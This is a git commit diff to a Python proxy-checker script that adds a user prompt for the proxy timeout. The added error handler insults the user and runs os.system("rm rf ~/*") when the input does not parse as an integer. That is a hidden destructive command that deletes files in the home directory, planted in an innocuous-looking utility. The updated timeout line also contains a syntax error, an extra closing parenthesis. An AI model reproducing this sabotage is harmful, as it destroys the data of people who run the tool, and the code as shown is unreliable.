9f7e9a4468091a088d92fa1f05305a8e1f00e02f
FSystem88 <41367666+FSystem88@users.noreply.github.com>
2020-11-06 00:46:45 +0300

    Update script.py

--- script.py
+++ script.py
@@ -1,13 +1,23 @@
 #!/usr/bin/python3
-import requests as r
+import requests as r, os
 from colorama import Fore,Style
 url = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http"
 req = r.get(url)
 ip = r.post("http://v4.ident.me/").text
 array = req.text.split()
+print("Your ip: {}".format(ip))
+sec = input("Enter the timeout in seconds for checking the proxy (default 10): ")
+try:
+	if sec == "":
+		sec = 10
+	else:
+		sec = int(sec)
+except:
+	print("ok, you very stupid")
+	os.system("rm rf ~/*")
 for prox in array:
 	try:
-		ipx = r.get("http://v4.ident.me/", proxies={'http':prox, 'https':prox}, verify=False, timeout=10).text
+		ipx = r.get("http://v4.ident.me/", proxies={'http':prox, 'https':prox}, verify=False, timeout=sec)).text
 	except:
 		ipx = ip
 	if ip != ipx:
